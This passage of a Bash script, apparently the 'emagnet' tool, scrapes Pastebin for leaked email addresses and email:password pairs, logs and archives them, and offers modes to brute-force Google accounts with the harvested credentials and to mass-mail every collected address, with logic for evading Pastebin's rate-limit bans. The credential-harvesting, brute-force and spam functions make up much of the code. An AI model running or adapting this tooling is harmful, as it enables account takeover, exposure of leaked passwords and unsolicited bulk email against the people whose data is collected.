    echo -e "[\e[1;31m<<\e[0m] - Enable a vpn or please try again later, aborted\n"
    exit 1
 fi
fi

if [[ $BROWSER = "lynx" ]]; then
    lynx -dump https://pastebin.com/languages|grep archive|sed '$d'|cut -c 7-|sed '1d'|cut -d'/' -f5|xargs -L3|column -t > /tmp/.emagnet-syntaxes
 elif [[ $BROWSER = "elinks" ]]; then
    elinks -dump https://pastebin.com/languages|grep archive|sed '$d'|cut -c 7-|sed '1d'|cut -d'/' -f5|xargs -L3|column -t > /tmp/.emagnet-syntaxes
 else
    choosebrowser
 fi

read -p "Syntax (ex: python): " SYNTAX2DL

if [[ -z $SYNTAX2DL ]]; then
    echo -e "[\e[1;31m\e[1m<<\e[0m\e[0m] - Duh! You must choose a syntax language to download, aborted.."
    exit 1
fi

if [[ $BROWSER = "elinks" ]]; then
    elinks -dump $PASTEBIN/$SYNTAX2DL|grep https|cut -c 6-|sed 's/com/com\/raw/g'|awk 'length($0)>31 && length($0)<35'|grep -v 'messages\|settings\|archive\|contact\|pastebin$\|languages' > /tmp/.emagnet-syntaxes-urls
elif [[ $BROWSER = "lynx" ]]; then
    lynx -dump $PASTEBIN/$SYNTAX2DL |grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>31 && length($0)<35'|grep -v 'language\|night_mode\|messages\|settings\|pastebin$\|archive\|contact'  > /tmp/.emagnet-syntaxes-urls
else
    choosebrowser
fi


grep -q "$SYNTAX2DL" /tmp/.emagnet-syntaxes
if [[ $? = "0" ]]; then
   printf "Downloading $(cat /tmp/.emagnet-syntaxes-urls|wc -l) $SYNTAX2DL files.."
   mkdir -p "$EMAGNETSYNTAX/$SYNTAX2DL"
   parallel -j $THREADS wget -nc -q -P "$EMAGNETSYNTAX/$SYNTAX2DL" {} < /tmp/.emagnet-syntaxes-urls &> /dev/null
   printf "\nDone.\n\n" | tr ' ' '.'
   rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
else
    echo -e "\n[\e[1;31m\e[1m<<\e[0m\e[0m] - Duh! That's \e[4mnot\e[0m a valid syntax language..\n"
    exit 1
    rm /tmp/.emagnet-syntaxes-urls /tmp/.emagnet-syntaxes &> /dev/null
fi
}

################################################################################
#### This is were we store all files for merging files into archive.........####
################################################################################
moveem() {
clear; banner
createbdirs() {
if [[ ! -d $EMAGNETARCHIVE/emagnet ]]; then
    mkdir -p $EMAGNETARCHIVE/{all-files,email-files,password-files,logs}
fi
}

copy_files() {
paths
AEXIST="$(echo $(ls /opt/emagnet/incoming/*/all-files/|wc -l))" 
EEXIST="$(echo $(ls /opt/emagnet/incoming/*/all-files/|wc -l))" 
PEXIST="$(echo $(ls /opt/emagnet/incoming/*/all-files/|wc -l))"

if [[ $AEXIST -gt "0" ]]; then
    echo -n "Copying all files into 'archive/all-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    cp -rn $EMAGNET/incoming/*/all-files/*  $EMAGNETARCHIVE/all-files &> /dev/null
else
    echo -n "Copying 'all-files' into 'archive/all-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $EEXIST -gt "0" ]]; then
    echo -n "Copying 'email-files' into 'archive/email-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files &> /dev/null
else 
    echo -n "Copying 'email-files' info 'archive/email-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $PEXIST -gt "0" ]]; then
    echo -n "Copying 'password-files' into 'archive/password-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]\n"
    cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files &> /dev/null
else 
    echo -n "Copying 'password-files' into 'archive/password-files' $(printf '\056%.0s' {1..55})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]\n"
fi
}

merge_logs() {
  paths
YEAR=$(echo $(date +%Y))

# Merge logs from incoming dirs into archive
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/emagnet.log; done
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/emails-from-pastebin.txt; done
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/passwords-from-pastebin.txt; done
    cd $EMAGNET/incoming; for i in *; do touch $i/logs/pastebin-urls.txt; done
if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/emagnet.log|wc -l) -gt "0" ]]; then
    echo -n "Merging 'emagnet.log' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    awk -F, '!seen[$1]++' $EMAGNET/incoming/*/logs/emagnet.log  >> $EMAGNETARCHIVE/logs/emagnet.log &> /dev/null
else
    echo -n "Merging 'emagnet.log' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi


# It's NOT a personal mistake or fail why I am using awk twice here, if you edit this it will fail.
if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/emails-from-pastebin.txt|wc -l) -gt "0" ]]; then
if [[ ! -f $EMAGNET/incoming/$YEAR-*-*/logs/emails-from-pastebin.txt ]]; then touch $EMAGNET/incoming/*/logs/emails-from-pastebin.txt; fi
    echo -n "Merging 'emails-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    awk -F, '!seen[$1]++'  $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|tr ' ' '\n'|awk -F, '!seen[$1]++' $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|tr ' ' '\n' >> $EMAGNETARCHIVE/logs/emails-from-pastebin.txt  2> /dev/null 
else
    echo -n "Merging 'emails-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/passwords-from-pastebin.txt|wc -l) -gt "0" ]]; then
if [[ ! -f $EMAGNET/incoming/$YEAR-*-*/logs/passwords-from-pastebin.txt ]]; then touch $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt; fi
    echo -n "Merging 'passwords-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
    awk -F, '!seen[$1]++' $EMAGNET/incoming/$YEAR-*-*/passwords-from-pastebin.txt >> $EMAGNETARCHIVE/logs/passwords-from-pastebin.txt  2> /dev/null
else
  echo -n "Merging 'passwords-from-pastebin.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi
if [[ $(cat $EMAGNET/incoming/$YEAR-*-*/logs/pastebin-urls.txt|wc -l) -gt "0" ]]; then

    echo -n "Merging 'pastebin-urls.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;32mDONE\e[0m]"
if [[ $INCLUDETIME = "true" ]]; then
    cat $EMAGNET/incoming/*/logs/pastebin-urls.txt >> $EMAGNETARCHIVE/logs/pastebin-urls.txt  2> /dev/null
else 
    grep "https" $EMAGNET/incoming/*/logs/pastebin-urls.txt |>> $EMAGNETARCHIVE/logs/pastebin-urls.txt  2> /dev/null
fi
else
    echo -n "Merging 'pastebin-urls.txt' $(printf '\056%.0s' {1..40})" | head -c 54 ; echo -e " [\e[1;31mFAILED\e[0m]"
fi

printf "\nAll data has been successfully merged into archive/logs\n\n"
read -p "Do you want to wipe incoming directories (y/n): " cleanup
if [[ $cleanup = "y" ]]; then
    rm -rf $EMAGNET/incoming/
    printf "\nSuccessfully \e[1;31mwiped\e[0m incoming directories..\n\n"
else
    printf "\nAborted.\n\n"
fi
}
createbdirs
copy_files
merge_logs
}

################################################################################
#### This is were we holds the code for spamming feature                    ####
################################################################################
emagnetspammer() {
source $CONF
clear;banner
ssmtp &> /dev/null
if [[ $? -gt "0" ]]; then
    printf "[\e[1;31m<<\e[0m] - Spammer require ssmtp to be installed and configured.\n\n"
    exit 1
fi

if [[ -z $EMAIL2SEND ]]; then
    printf "[\e[1;31m<<\e[0m] - You must create a text file with the text you want to send\n"
    printf "[\e[1;31m<<\e[0m] - to all targets, when text file has been created then you must\n"
    printf "[\e[1;31m<<\e[0m] - set text file in /etc/emagnet.conf under EMAIL2SEND=/path/textfile\n\n"
    exit 1
fi

if [[ ! -f $EMAIL2SEND ]]; then
    printf "Can't find $EMAIL2SEND, aborted..\n\n"
    exit 1
fi

if [[ $(ls $EMAGNETDB|wc -l) -eq "0" ]]; then
    echo -e "[\e[0;33m<<\e[0m] - No email addresses has been found today.."
    echo -e "[\e[0;33m<<\e[0m] - Let's run emagnet by hit [enter] or hit any other for stop.."
    read  -s -n 1 key
    if [[ -z $key ]]; then
        bash emagnet --emagnet 
    else
        echo -e "[\e[1;31m<<\e[0m] - Let's spam some email addresses another day, aborted. :-(\n";exit 1; fi
    exit 1
else
NRTARGETS="$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2|wc -l)"
printf "%24s \e[1;31mTargets: \e[1;32m$NRTARGETS\e[0m\e[0m\n\n"
read -p "- Do you want to send an email to all targets (yes/NO): " sendtoall
    case $sendtoall in
    yes) printf "%62s \n" | tr ' ' '='
        grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETDB|cut -d: -f2 > /tmp/.emagnet-spammer
           while read e1; do printf "%-57s%s\n" "[+] Sending email to $e1 $(ssmtp $e1 < "$EMAIL2SEND")" "[DONE]" | tr ' ' '.' 
           done < /tmp/.emagnet-spammer
        rm /tmp/.emagnet-spammer &> /dev/null ;;
       *) echo -e "- Aborted..\n";exit 1 ;;
    esac

fi
}

################################################################################
################################################################################
#### And finally the heart of emagnet is stored below ##########################
################################################################################
####                                                                       #####
####                   EMAGNET's MAIN CODE BEGINS HERE                     #####
####                                                                       #####
################################################################################
################################################################################
################################################################################
emagnet2() {
   CONF="/etc/emagnet.conf"
   source $CONF
if [[ $BROWSER = "elinks" ]]; then
   elinks -dump $PASTEBIN|grep https|cut -c 6-|sed 's/com/com\/raw/g'|awk 'length($0)>31 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping\|contact\|pastebin$\|settings' > /tmp/.emagnet1
   ls -1 $EMAGNETALL |sort > 1
   cat /tmp/.emagnet1|sort |cut -d/ -f5 > 2
   grep  -v -x -F -f 1 2  | awk -F, '!seen[$1]++'|sed "s/^/https:\/\/pastebin.com\/raw\//g" > /tmp/.emagnet
    rm 1 2 &> /dev/null
 else
   lynx -dump $PASTEBIN|grep https|cut -c 6-|sed 's/com/com\/raw/g'|awk 'length($0)>31 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping\|contact\|pastebin$\|settings\|signup\|raw\/$\|alerts' > /tmp/.emagnet1
   ls -1 $EMAGNETALL |sort > 1
   cat /tmp/.emagnet1|sort |cut -d/ -f5 > 2
   grep -v -x  -F -f 1 2 | awk -F, '!seen[$1]++'|sed "s/^/https:\/\/pastebin.com\/raw\//g" > /tmp/.emagnet
   rm 1 2 &> /dev/null
fi

if [[ $(cat /tmp/.emagnet1|wc -l) = "8" ]]; then
clear;banner
   echo -e "                            \e[1;31mNOTICE\e[0m:\n"
   echo -e "[\e[1;31m<<\e[0m] - You are scraping pastbin.com way too fast! \e[1;31mSlow Down\e[0m!"
   echo -e "[\e[1;31m<<\e[0m] - Pastebin has blocked you from the archive page until you slow down."
   echo -e "[\e[1;31m<<\e[0m] - You will only be able to download 8 files at time until you raise TIME"
   echo -e "[\e[1;31m<<\e[0m] - The block from pastebin.com/archive will be lifted within 20 minutes.."
sleep 7
clear;banner
fi
##########################################################################################################
##### If /tmp/.emagnet havent grabbed some urls, we double check response from pastebin..............#####
##### and searching for the word blocked since then we have been banned..............................#####
##########################################################################################################
if [[ $(cat /tmp/.emagnet1|grep https) = "0" ]]; then
# // Have we been banned?
heavyload
Iwasbanned
fi

# // Using wget via -P instead of joining temp path since we grabbingall data via the variable anyway..
parallel -j200% -n8 -a /tmp/.emagnet wget -nc -P $EMAGNETTEMP &> /dev/null

# // For how many files we have been downloaded
# // If there is below 10 add 0 infront of X
tt="$(ls $EMAGNETTEMP | wc -l)"
if [[ $tt -lt "10" ]]; then 
  tt="0$tt"
fi

# // If no files was found, then let user know that it might be good to rise TIME in /etc/emagnet.conf
if [[ $tt = "00" ]]; then
   $BROWSER -dump $PASTEBIN|grep -q "blocked"
 if [[ $? = "0" ]]; then
   Iwasbanned
 fi
   printf "[\e[1;31m<<\e[0m] - No files has been downloaded, you may wanna rise time?\n\n"
   tt="\e[1;31m\e[5m00\e[0m"
   sleep 5
   clear
   banner
else
echo -e "\nURLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n=================================" >> $EMAGNETLOGS/pastebin-urls.txt
cat /tmp/.emagnet >> $EMAGNETLOGS/pastebin-urls.txt
fi
##########################################################################################################
##### We using some awesome regex to grab what we looking for........................................#####
##########################################################################################################

# // Regex for email addresses
i=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'   $EMAGNETTEMP|cut -d: -f1|tr ' ' '\n')
il=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|cut -d: -f2|tr ' ' '\n')
it=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b'  $EMAGNETTEMP|wc -l|tr ' ' '\n')
if [[ $it -lt "10" ]]; then it=0$it;fi

# // Regex for email addresses including a password
p=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$"  $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S' |sed 's/|/:/g'|tr ' ' '\n')
pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*"  $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)
if [[ $pt -lt "10" ]]; then pt=0$pt;fi

########################################################################################
#### If we fetched urls we checking for mail addresses && passwords and if we have..####
#### found more then 0 data we move files & echo all data we have found to our logs.####
########################################################################################
if [[ $pt -gt "00" ]] && [[ $it -gt "00" ]]; then

########################################################################################
#### When we found passwords and email addresses we will move and echo them to......####
#### the files that has been set in /emagnet.conf...................................####
########################################################################################
   echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: \e[1;31m$(whoami)\e[0m - Found \e[1;32m$pt\e[0m password from: $EMAGNETPW/${i##*/}" | xargs >> $EMAGNETLOGS/emagnet.log

   grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|awk '{print $1}' |cut -d: -f2,3 |uniq | grep -v '/' | grep -v '"' | grep -v ','|grep -v '<' | grep -v '>' > $EMAGNETLOGS/passwords-from-pastebin.txt 
   grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP| cut -d: -f2 |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
   printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
   printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n"
   printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
   cp -rn $p $EMAGNETPW/ &> /dev/null
   cp -rn $i $EMAGNETDB/ &> /dev/null
   sleep 2
   if [[ $GBRUTEFORCE = "true" ]]; then
   	printf "%64s \n\n" | tr ' ' '='
   	printf "%14s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mO\e[1;33mO\e[1;34mG\e[0;32mL\E[1;31mE\e[0m") ACCOUNTS\e[0m\n\n"
   	 bruter
   	else
   	 sleep 2
   	fi
   cp -rn $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null

##########################################################################################
#  | If we are not banned and we get 0 emails then we have 0                 |         | #
#  | passwords also since without mail we wont find any passwords and        |         | #
#  | in this case we still want to move files and echo urls to logs          |         | #
###|###################################################################################|##
#  |____________¸                    |                                       |         | #
#               ˇ                    ˇ                                       ˇ         ˇ #
 elif [[ $pt = "00" ]] && [[ $it -gt "00" ]]; then

# // Handle logs for email only since password is 0 and echo how many we found
   echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found \e[1;36m$it\e[0m  emails from ${i##*/}"    | xargs >> $EMAGNETLOGS/emagnet.log

# // Handle logs for email only since password is 0 and echo emails to its file
   grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP| cut -d: -f2 |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt

# // Copy / Move mail file
   cp $i $EMAGNETDB/ &> /dev/null

# // Move everything
   mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null

# // We will let the user know how many mail addresses we found
       printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
       printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
       printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"
       sleep 5
else
# // We will let the user know that nothing were found
       printf "%17s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
       printf "%17s[\e[1;31m00\e[0m] - No Passwords Was Found\n\n"
       printf "%17s[\e[1;31m00\e[0m] - No Email Address Was Found\n\n"
       sleep 3.2
fi


}

################################################################################
#### This will stop after we found email, run 4ever if its in a loop        ####
################################################################################
dontstopwhenfound() {
$BROWSER -dump $PASTEBIN|grep -q "blocked your IP"
if [[ $? = "0" ]]; then
 if [[ $VPN = "true" ]]; then
    banned
 else
    Iwasbanned
 fi
fi
for (( ; ; )); do
  clear
  banner
  countdown
  clear
  banner
  analyz
  clear
  banner
  emagnet2
  mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
done
}

################################################################################
#### This will stop after we found email, run 4ever if its in a loop        ####
################################################################################

################################################################################
#### Below is how we call all functions for emagnet                         ####
#### - This is very ugly I know sorry for that                              ####
#### - I haven't fixed this but I will do this part much much better soon   ####
################################################################################
case $1 in

       "-a"|"-author"|"--author")
cat << "EOF"

 Copyright (C) 2018-2019, wuseman

 Emagnet was founded in 2015 and was released as open source
 on github.com/wuseman/emagnet in January 2018 and is licensed
 under GNU LESSER GENERAL PUBLIC LICENSE Version v3.1

   - Author: wuseman <wuseman@nr1.nu>
   - IRC   : wuseman <irc.freenode.com>

 Please report bugs/issues on:

   - https://github.com/wuseman/EMAGNET/issues

EOF
;;

"emagnet"|"-e"|"-emagnet"|"--emagnet")
source $CONF
sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' $CONF
source $CONF
clear
banner
check4all
PWD="$(pwd)"
if [[ -d "/usr/bin" ]]; then
 if ! [[ -h "/usr/bin/emagnet" ]] || ! [[ -L "/usr/bin/emagnet" ]] ; then
  cd /usr/bin/
  ln -s $PWD/emagnet emagnet
 fi
fi

if [[ $GBRUTEFORCE = "false" ]]; then
      dontstopwhenfound
fi
     mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
;;

"-g"|"-bruteforce"|"--bruteforce")
source $CONF
check4all
sleep 0.5
source $CONF
sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' $CONF
source $CONF
if [[ $GBRUTEFORCE = "true" ]]; then
        clear; banner
        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
       dontstopwhenfound
else
      printf "emagnet: unknown error -- is /etc/emagnet.conf broken?\n"
       exit 1
fi
      mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
;;


"help"|"-h"|"-help"|"--help")
      usage
      exit 1
;;

"-i"|"-ip"|"--ip")
      printf 'IP: %s\n' "$(curl -s https://nr1.nu/i/)"
      exit 1
;;

"-k"|"-kill"|"--kill")
clear;banner
ESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}')
NRESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}'|wc -l)

if [[ $NRESESSIONS -lt "3" ]]; then
      echo -e "[\e[0;33m<<\e[0m] - Duh! \e[4m0\e[0m emagnet sessions is currently running..\n"
else
      echo -e "[\e[1;31m<<\e[0m] - Killed $(echo $NRESESSIONS-2|bc) emagnet sessions ... (#+_+)"
      kill -SIGKILL $ESESSIONS &> /dev/null
fi
;;

"-l"|"-license"|"--license")
      printf "%s\n" "Printing LICENSE - Use 'q' to quit"
      sleep 2
      curl -s https://nr1.nu/licenses/LICENSE.md|less
      printf "%s\n" "Thank you.."
;;

"-m"|"-move"|"--move")
      check4all
      moveem
;;

"-s"|"-spam"|"--spam")
     check4all
      emagnetspammer
;;

"-d"|"-stats"|"--stats")
      check4all
      stats
      exit 1

;;

"-x"|"-syntax"|"--syntax")
      check4all
      clear;banner
      emagnetsyntax
;;

"-q"|"-quiet"|"--quiet")
      check4all
      pid="$(ps aux |grep emagnet)"
      screen -dmS emagnet emagnet --emagnet
      printf "[\e[1;32m>>\e[0m] - Emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n\n"
 ;;

"version"|"-version"|"--version"|"-V")
     source $CONF
     printf "Emagnet Version: v$VERSION\n"
 ;;

"-t"|"-time"|"--time")
     source $CONF
     clear
     banner

re='^[0-9]+$'
if ! [[ $2 =~ $re ]] ; then
   echo -e "[\e[1;31m<<\e[0m] - emagnet: internal error -- that's not a valid number\n" >&2; exit 1
fi
 if [[ -z $2 ]]; then
     echo "Time require an value to be set, aborted.."
     exit 1
 fi
     sed -i '30d' $CONF
     sed -i "30 i TIME=$2" $CONF
     printf "[\e[1;32m>>\e[0m] - Config file has been updated, time has been set to to: \e[1;1m$2\e[0ms\n\n"; exit 1
;;

 "-v"|"-vpn"|"--vpn")
source $CONF
clear
banner

if [[ -z $2 ]]; then
     echo -e "[\e[1;31m<<\e[0m] - emagnet: internal error - vpn require a true/false value..\n"
     exit 1
fi
if [[ $2 = "true" ]] || [[ $2 = "on" ]] || [[ $2 = "enable" ]]; then
     sed -i '149d' $CONF;sed -i "149i VPN=true" $CONF
     echo -e "[\e[1;32m>>\e[0m] - VPN has been set to true: \e[1;32mON\e[0m\n";exit 1
elif [[ $2 = "false" ]] || [[ $2 = "off" ]] || [[ $2 = "disable" ]]; then
     sed -i '149d' $CONF;sed -i "149i VPN=false" $CONF
     echo -e "[\e[1;31m<<\e[0m] - VPN has been set to false: \e[1;31mOFF\e[0m\n";exit 1
else
     echo -e "emagnet: internal error -- $2 is an unknown option - please use true or false"
     exit 1 
fi
;;

"-b"|"-backup"|"--backup")
    clear;banner;source $CONF

if [[ ! -d $EMAGNETBACKUP ]]; then
   mkdir -p $EMAGNETBACKUP
fi

if [[ ! -d "$EMAGNET" ]]; then
    echo "[\e[1;32m<<\e[0m] - Duh! Can't do anything since no emagnet folder exists, aborted.."
exit 1
fi

if [[ -f "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz" ]]; then
         echo "You have already created a backup today.."
         read -p "Do you want to overwrite the old backup (yes/no) " overwriteoldbackup
    if [[ $overwriteoldbackup = "yes" ]]; then
if [[ $* = "all" ]]; then
         rm "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz"
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
             tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz"
         else
             tar -cjf "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" "$EMAGNET"
         fi
elif [[ $* = "incoming" ]]; then
         rm "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz"
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET/incoming"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" "$EMAGNET/incoming"
         fi
elif [[ $* = "archive" ]]; then
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
              tar -cf - --absolute-names "$EMAGNETBACKUP"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz"
         else
              tar -cjf "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" "$EMAGNETBACKUP"
         fi
else
         printf "emagnet: error -- please specify incoming, archive or all\n\n"
         exit 1
fi
    else
         printf "Aborted..\n"
fi
    exit 1
fi

if [[ $2 = "all" ]]; then
       echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" "$EMAGNET"
         fi

elif [[ $2 = "incoming" ]]; then
       echo -e "Compressing $EMAGNET, please wait.."
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET/incoming"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" "$EMAGNET/incoming"
         fi

elif [[ $2 = "archive" ]]; then
         pigz -h &> /dev/null 
         if [[ $? -eq "0" ]]; then
              tar -cf - --absolute-names "$EMAGNETBACKUP"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz"
         else 
              tar -cjf "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" "$EMAGNETBACKUP"
         fi  

else
         echo -e "emagnet: error -- please specify incoming, archive or all\n"
         exit 1
fi
      printf "\nBackup has successfully been created..\n\n"

;;

"-setup"|"--setup")
if [[ $1 = "--setup" ]]; then
   file emagnet-setup.sh &> /dev/null
if [[ $? -eq "0" ]]; then
      bash ./emagnet-setup.sh
else
    printf "emagnet: internal errror -- can't find emagnet-setup.sh\n"
fi
fi
;;

"\?") usage ;;


*)   clear;banner
     printf "emagnet: internal error -- './emagnet --help'\n\n"
     exit 1 ;;

esac

#!/bin/bash

